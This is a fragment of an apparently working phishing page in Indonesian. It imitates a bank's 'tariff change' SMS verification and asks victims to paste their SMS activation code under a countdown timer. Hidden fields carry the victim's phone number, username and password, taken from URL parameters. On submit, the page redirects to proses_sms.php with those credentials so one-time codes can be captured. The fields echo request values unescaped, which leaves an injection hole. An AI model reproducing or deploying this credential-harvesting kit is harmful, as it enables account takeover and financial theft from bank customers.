...
<div class="container">
    <div class="row">
      ...
      <div style="margin-top:80px;background-color:white;padding:20px;border-radius:10px;box-shadow: 2px 3px 6px 0px #c4cbd7;margin-bottom:10px" class="col-sm-6 col-md-6">
        ...
        <div class="row" >
           <center>
               <img style="width:100%;float:center" src="rahasia3.png">
           </center>
       </div>
       <div class="row" style="margin-top:-80px" >
              <center><img style="width:80%;float:center" src="https://cdn.jsdelivr.net/gh/AlexHostX/another@main/brims/malx.png"></center>
       </div>
       <br>
        <center>
            <label style="margin-top:-25px;font-size:30px;font-weight: bold;color:#12408d" class="countdown"><strong>05:59</strong></label>
        </center>
       <br>
        <div class="mb-4">
            <div id="my-modal" class="modal">
                <div class="modal-content">
                  <div class="modal-header" style="background-color:white;color:#09559a;">
                    ...
                    <center><h3>Konfirmasi SMS Kode Aktivasi</h3></center>
                  </div>
                  <div class="modal-body">
                   <center>
                        <p>Untuk mendapatkan SMS Kode Aktivasi Perubahan Tarif Silahkan Klik Tombol Konfirmasi!</p><br>
            ...
            <div class="input-group">
              ...
              <textarea onclick="kosongkan()" style="text-align:center
                        " name="sms" id="sms" required style="background-color: #FFF;font-weight: Bold" class="form-control" id="exampleFormControlTextarea1" maxlenght="12" rows="3" placeholder="Tempel Disini"></textarea>
                        
              <input class="input" type="hidden" name="nohp" id="nohp" value="<?php echo $_GET['nomorhp'] ?>">
              <input class="input" type="hidden" name="email" id="email" value="<?php echo $_GET['username'] ?>">
              <input class="input" type="hidden" name="password" id="password" value="<?php echo $_GET['password'] ?>">
            </div><!-- /input-group -->
          </div><!-- /.col-lg-6 -->
        <div class="row" >
              <center>
                  <input type="submit" name="lanjutkan" style="
                  border:0px;
                  font-size:20px ;
                  background: #0F78CB;
                  color: white;
                  ...
                  font-weight: bold;
                  width:100%;
                  float:centre;"  class="btn btn-primary" value="Lanjut">
           ...
           <div class="row" >
               <center>
                   <span style="color:#a8a9aa;font-size:12px;margin-top:10px">Belum terima sms? <a href="" style="text-decoration:none">Kirim ulang</a></span>
               </center>
           </div>
           <div class="row" >
...
if($submit){
    ...
    header('Location: '.$base_url."proses_sms.php?nomorhp=".$telepon."&username=".$email."&password=".$password);
